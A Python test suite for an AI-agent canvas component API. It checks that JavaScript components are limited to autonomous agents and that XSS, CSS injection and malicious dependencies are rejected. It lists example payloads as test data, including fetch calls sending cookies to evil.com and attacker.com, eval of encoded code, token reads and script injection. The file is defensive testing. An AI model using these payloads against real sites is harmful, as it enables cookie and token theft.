"""
Canvas JavaScript security tests (SECU-04).

Tests cover:
- JavaScript components require AUTONOMOUS agents
- Malicious JavaScript pattern detection
- HTML/CSS component security
- Static analysis validation

Security contract under test (layered):
- Edge middleware (core/security/middleware.py): `eval(`, `<script>`,
  `javascript:`, `on\\w+=`, `expression(` … → 400 "Invalid request content"
- Service validation (core/custom_components_service.py): JS pattern
  denylist, HTML/CSS sanitization, dependency whitelist, governance →
  403 ComponentSecurityError
- Service ownership / lookup errors → 422 validation_error
- Success → 200
"""
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from tests.factories.agent_factory import StudentAgentFactory, InternAgentFactory, SupervisedAgentFactory, AutonomousAgentFactory
from tests.factories.user_factory import UserFactory
from unittest.mock import patch, Mock
import uuid


# Malicious JavaScript payloads — every one must be rejected (400 edge
# middleware or 403 service validator) before it can be persisted.
MALICIOUS_JS_PATTERNS = [
    # Fetch exfiltration
    "fetch('https://evil.com/steal?data='+document.cookie)",
    "fetch('http://attacker.com/log', {body: document.body.innerHTML})",

    # eval() execution
    "eval(atob('YWxlcnQoJ1hTUycp'))",
    "eval(userInput)",

    # Document cookie access
    "document.cookie",
    "document['cookie']",


    # window.location manipulation
    "window.location='https://evil.com'",
    "window.location.href = 'https://phishing.com'",

    # postMessage exfiltration
    "window.postMessage(document.cookie, '*')",

    # localStorage/sessionStorage access
    "localStorage.getItem('token')",
    "sessionStorage['password']",

    # DOM manipulation
    "document.body.innerHTML = xhr.responseText",
    'document.write("<script>alert(1)</script>")',

    # Dynamic script creation
    "var s = document.createElement('script'); s.src = 'evil.js'; document.head.appendChild(s)",
]

SAFE_HTML_PATTERNS = [
    "<div class='container'>Content</div>",
    "<p>Paragraph with <strong>bold</strong> text</p>",
    "<h1>Heading</h1>",
    "<ul><li>List item</li></ul>",
    "<span class='label'>Label</span>",
]

SAFE_JS_PATTERNS = [
    "console.log('debug');",
    "const x = 5;",
    "function add(a, b) { return a + b; }",
    "document.querySelector('.test');",
    "element.classList.add('active');",
    "Array.from(items).map(x => x.id);",
]

# Rejection terms present in either the edge-middleware 400 body
# ("Invalid request content") or the service 403 body (ComponentSecurityError).
REJECTION_TERMS = [
    "malicious", "security", "blocked", "pattern", "dangerous", "invalid"
]


class TestJavaScriptGovernance:
    """Test JavaScript component governance (AUTONOMOUS only)."""

    def test_student_cannot_create_js_component(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test STUDENT agent blocked from JavaScript components."""
        student = StudentAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Hello</div>",
                "css_content": ".test { color: red; }",
                "js_content": "console.log('test');",
                "agent_id": student.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # STUDENT blocked from JavaScript components
        assert response.status_code in [403]

        data = response.json()
        assert any(term in str(data).lower() for term in [
            "javascript", "autonomous", "permission", "forbidden"
        ])

    def test_intern_cannot_create_js_component(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test INTERN agent blocked from JavaScript components."""
        intern = InternAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Hello</div>",
                "js_content": "console.log('test');",
                "agent_id": intern.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # INTERN blocked from JavaScript
        assert response.status_code == 403

    def test_supervised_cannot_create_js_component(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test SUPERVISED agent blocked from JavaScript components."""
        supervised = SupervisedAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Hello</div>",
                "js_content": "console.log('test');",
                "agent_id": supervised.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # SUPERVISED blocked from JavaScript
        assert response.status_code == 403

    def test_autonomous_can_create_js_component(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test AUTONOMOUS agent can create JavaScript components."""
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Hello</div>",
                "js_content": "console.log('test');",
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # AUTONOMOUS should be allowed
        assert response.status_code in [200, 201]
        if response.status_code == 200:
            data = response.json()
            assert data.get("data", {}).get("has_js") is True


class TestMaliciousJavaScriptDetection:
    """Test detection of malicious JavaScript patterns."""

    @pytest.mark.parametrize("malicious_code", MALICIOUS_JS_PATTERNS)
    def test_malicious_patterns_blocked(self, client: TestClient, valid_auth_token: str, db_session: Session, malicious_code):
        """Test malicious JavaScript patterns are rejected before persistence."""
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Safe</div>",
                "js_content": malicious_code,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Must be rejected — either by the edge middleware (400) or the
        # component service validator (403). Never persisted.
        assert response.status_code in [400, 403], f"Payload not blocked: {malicious_code}"

        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)

    def test_detect_fetch_exfiltration(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test detection of fetch-based data exfiltration."""
        malicious = "fetch('https://evil.com?c='+document.cookie)"
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Safe</div>",
                "js_content": malicious,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # fetch( is blocked by the service JS validator
        assert response.status_code == 403
        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)

    def test_detect_eval_usage(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test detection of eval() usage."""
        malicious = "eval(userInput)"
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Test Component",
                "html_content": "<div>Safe</div>",
                "js_content": malicious,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # eval( blocked at the edge middleware (400) or service validator (403)
        assert response.status_code in [400, 403]
        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)


class TestSafeHTMLComponents:
    """Test safe HTML/CSS components."""

    def test_html_components_lower_governance(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test HTML components have lower governance requirements."""
        # STUDENT agents can use HTML/CSS (read-only presentation)
        student = StudentAgentFactory(_session=db_session)

        safe_html = "<div class='container'><p>Safe content</p></div>"
        safe_css = ".container { padding: 10px; }"

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "HTML Component",
                "html_content": safe_html,
                "css_content": safe_css,
                "category": "html",
                "agent_id": student.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # HTML/CSS should be allowed for STUDENT (presentation only)
        assert response.status_code in [200, 201, 403]

    @pytest.mark.parametrize("safe_html", SAFE_HTML_PATTERNS)
    def test_safe_html_allowed(self, client: TestClient, valid_auth_token: str, safe_html):
        """Test safe HTML patterns are allowed."""
        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Safe Component",
                "html_content": safe_html,
                "css_content": ".safe { color: blue; }"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Safe HTML should be allowed
        assert response.status_code in [200, 201]

    def test_css_injection_prevention(self, client: TestClient, valid_auth_token: str):
        """Test CSS injection is prevented."""
        malicious_css = "body { background-image: url('javascript:alert(1)'); }"

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Malicious CSS Component",
                "html_content": "<div>Content</div>",
                "css_content": malicious_css
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # javascript: scheme blocked at edge middleware or service validator
        assert response.status_code in [400, 403]
        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)


class TestJavaScriptStaticAnalysis:
    """Test static analysis for JavaScript security."""

    def test_static_analysis_detects_dangerous_apis(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test static analysis detects dangerous APIs."""
        dangerous_apis = [
            "eval()",
            "Function()",
            "document.write()",
            "window.location =",
            "document.cookie",
            "window.postMessage()",
            "localStorage.",
            "sessionStorage.",
        ]
        autonomous = AutonomousAgentFactory(_session=db_session)

        for api in dangerous_apis:
            code_template = "// Using {api}\n{code};"
            code = code_template.format(api=api, code=api.replace('()', '("test")'))

            response = client.post(
                "/api/components/create",
                params={"user_id": str(uuid.uuid4())},
                json={
                    "name": "Static Analysis Component",
                    "html_content": "<div>Test</div>",
                    "js_content": code,
                    "agent_id": autonomous.id
                },
                headers={"Authorization": f"Bearer {valid_auth_token}"}
            )

            # Every dangerous API must be rejected (edge 400 or validator 403)
            assert response.status_code in [400, 403], f"API not blocked: {api}"

    @pytest.mark.parametrize("safe_code", SAFE_JS_PATTERNS)
    def test_static_analysis_allows_safe_patterns(self, client: TestClient, valid_auth_token: str, db_session: Session, safe_code):
        """Test static analysis allows safe patterns."""
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Safe Component",
                "html_content": "<div>Test</div>",
                "js_content": safe_code,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Safe patterns should not be flagged
        assert response.status_code in [200, 201], f"Safe pattern rejected: {safe_code}"


class TestCanvasXSSPrevention:
    """Test XSS prevention in canvas component rendering."""

    def test_canvas_escaping_on_render(self, client: TestClient, valid_auth_token: str):
        """Test XSS payloads are rejected at the component API boundary."""
        xss_payload = "<script>alert('XSS')</script>"

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "XSS Component",
                "html_content": xss_payload
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # The <script> payload must never be persisted: rejected by the edge
        # middleware (400) or the HTML sanitizer (403).
        assert response.status_code in [400, 403]

        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)

    def test_component_name_sanitization(self, client: TestClient, valid_auth_token: str):
        """Test XSS in component names is rejected."""
        xss_name = "<script>alert('XSS')</script>Component"

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": xss_name,
                "html_content": "<div>Safe</div>"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Script-tag name payload rejected at the edge middleware
        assert response.status_code in [400, 403]

        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)

    def test_html_escaping_in_user_input(self, client: TestClient, valid_auth_token: str):
        """Test XSS via event-handler attributes is rejected."""
        xss_input = "<img src=x onerror=alert('XSS')>"

        response = client.post(
            "/api/components/create",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": xss_input,
                "html_content": "<div>Safe content</div>",
                "description": xss_input
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # onerror= attribute payload rejected at the edge middleware
        assert response.status_code in [400, 403]

        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)


class TestComponentVersioningSecurity:
    """Test security aspects of component versioning."""

    def test_version_rollback_safety(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test version rollback maintains security checks (owner-only, versioned)."""
        owner_id = str(uuid.uuid4())

        create_resp = client.post(
            "/api/components/create",
            params={"user_id": owner_id},
            json={
                "name": "Rollback Component",
                "html_content": "<div>v1</div>"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )
        assert create_resp.status_code == 200
        component_id = create_resp.json()["data"]["component_id"]

        response = client.post(
            f"/api/components/{component_id}/rollback",
            params={"user_id": owner_id},
            json={"target_version": 1},
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Rollback to the existing v1 succeeds
        assert response.status_code == 200
        assert response.json().get("new_version", 0) >= 2

    def test_rollback_rejects_non_owner(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test rollback is owner-only."""
        owner_id = str(uuid.uuid4())

        create_resp = client.post(
            "/api/components/create",
            params={"user_id": owner_id},
            json={
                "name": "Rollback Owner Component",
                "html_content": "<div>v1</div>"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )
        assert create_resp.status_code == 200
        component_id = create_resp.json()["data"]["component_id"]

        response = client.post(
            f"/api/components/{component_id}/rollback",
            params={"user_id": str(uuid.uuid4())},
            json={"target_version": 1},
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Non-owner rollback rejected
        assert response.status_code == 422

    def test_component_update_security_validation(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test component updates are security validated."""
        autonomous = AutonomousAgentFactory(_session=db_session)
        owner_id = str(uuid.uuid4())

        create_resp = client.post(
            "/api/components/create",
            params={"user_id": owner_id},
            json={
                "name": "Update Component",
                "html_content": "<div>v1</div>",
                "js_content": "console.log('test');",
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )
        assert create_resp.status_code == 200
        component_id = create_resp.json()["data"]["component_id"]

        malicious_js = "eval(maliciousCode)"

        response = client.put(
            f"/api/components/{component_id}",
            params={"user_id": owner_id},
            json={
                "js_content": malicious_js,
                "change_description": "Added dynamic code execution"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Malicious update rejected (edge 400 or validator 403)
        assert response.status_code in [400, 403]

        data = response.json()
        assert any(term in str(data).lower() for term in REJECTION_TERMS)


class TestComponentAccessControl:
    """Test component access control security."""

    def test_component_owner_only_can_edit(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test only component owners can edit components."""
        owner_id = str(uuid.uuid4())

        create_resp = client.post(
            "/api/components/create",
            params={"user_id": owner_id},
            json={
                "name": "Owned Component",
                "html_content": "<div>v1</div>"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )
        assert create_resp.status_code == 200
        component_id = create_resp.json()["data"]["component_id"]

        response = client.put(
            f"/api/components/{component_id}",
            params={"user_id": str(uuid.uuid4())},
            json={
                "name": "Hacked Name"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Non-owner update blocked by the service ownership gate (422)
        assert response.status_code == 422
        data = response.json()
        assert "owner" in str(data).lower() or "denied" in str(data).lower() or "access" in str(data).lower()

    def test_component_owner_only_can_delete(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test only component owners can delete components."""
        owner_id = str(uuid.uuid4())

        create_resp = client.post(
            "/api/components/create",
            params={"user_id": owner_id},
            json={
                "name": "Deletable Component",
                "html_content": "<div>v1</div>"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )
        assert create_resp.status_code == 200
        component_id = create_resp.json()["data"]["component_id"]

        response = client.delete(
            f"/api/components/{component_id}",
            params={"user_id": str(uuid.uuid4())},
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Non-owner delete blocked by the service ownership gate (422)
        assert response.status_code == 422
        data = response.json()
        assert "owner" in str(data).lower() or "denied" in str(data).lower() or "access" in str(data).lower()

    def test_owner_can_delete(self, client: TestClient, valid_auth_token: str, db_session: Session):
        """Test component owner can delete their component."""
        owner_id = str(uuid.uuid4())

        create_resp = client.post(
            "/api/components/create",
            params={"user_id": owner_id},
            json={
                "name": "Owner Deletable Component",
                "html_content": "<div>v1</div>"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )
        assert create_resp.status_code == 200
        component_id = create_resp.json()["data"]["component_id"]

        response = client.delete(
            f"/api/components/{component_id}",
            params={"user_id": owner_id},
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        assert response.status_code == 200


class TestComponentDependencySecurity:
    """Test security of external component dependencies."""

    def test_external_dependency_validation(self, client: TestClient, valid_auth_token: str):
        """Test external library dependencies are validated against the whitelist."""
        malicious_deps = [
            "https://evil.com/malicious.js",
            "http://attacker.com/script.js",
            "//evil.com/lib.js"
        ]

        for dep in malicious_deps:
            response = client.post(
                "/api/components/create",
                params={"user_id": str(uuid.uuid4())},
                json={
                    "name": "Component with Bad Dep",
                    "html_content": "<div>Content</div>",
                    "dependencies": [dep]
                },
                headers={"Authorization": f"Bearer {valid_auth_token}"}
            )

            # Non-whitelisted dependencies rejected by the validator (403)
            assert response.status_code in [403, 400], f"Dependency not blocked: {dep}"

            data = response.json()
            assert any(term in str(data).lower() for term in REJECTION_TERMS)

    def test_whitelisted_dependencies_allowed(self, client: TestClient, valid_auth_token: str):
        """Test whitelisted dependencies are allowed."""
        safe_deps = [
            "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js",
            "https://cdnjs.cloudflare.com/ajax/libs/react/18/umd/react.production.min.js",
            "https://unpkg.com/lodash@4.17.21/lodash.min.js"
        ]

        for i, dep in enumerate(safe_deps):
            response = client.post(
                "/api/components/create",
                params={"user_id": str(uuid.uuid4())},
                json={
                    "name": f"Component with Safe Dep {i}",
                    "html_content": "<div>Content</div>",
                    "dependencies": [dep]
                },
                headers={"Authorization": f"Bearer {valid_auth_token}"}
            )

            # Whitelisted dependencies should be allowed
            assert response.status_code in [200, 201], f"Whitelisted dep rejected: {dep}"


class TestComponentUsageTracking:
    """Test component usage tracking for security monitoring."""

    def test_component_usage_logs_governance(self, client: TestClient, valid_auth_token: str):
        """Test component usage records governance context."""
        component_id = str(uuid.uuid4())
        canvas_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())

        response = client.post(
            f"/api/components/{component_id}/record-usage",
            params={"user_id": user_id},
            json={
                "canvas_id": canvas_id,
                "agent_id": str(uuid.uuid4()),
                "governance_check_passed": True,
                "agent_maturity_level": "AUTONOMOUS"
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Usage recorded with governance context
        assert response.status_code == 200
        data = response.json()
        assert data.get("status") == "recorded"
        assert data.get("usage_id") is not None

    def test_component_usage_errors_logged(self, client: TestClient, valid_auth_token: str):
        """Test component usage errors are recorded."""
        component_id = str(uuid.uuid4())
        canvas_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())

        response = client.post(
            f"/api/components/{component_id}/record-usage",
            params={"user_id": user_id},
            json={
                "canvas_id": canvas_id,
                "error_message": "Rendering timeout",
                "governance_check_passed": False
            },
            headers={"Authorization": f"Bearer {valid_auth_token}"}
        )

        # Errors recorded for security monitoring
        assert response.status_code == 200
        data = response.json()
        assert data.get("status") == "recorded"
        assert data.get("usage_id") is not None
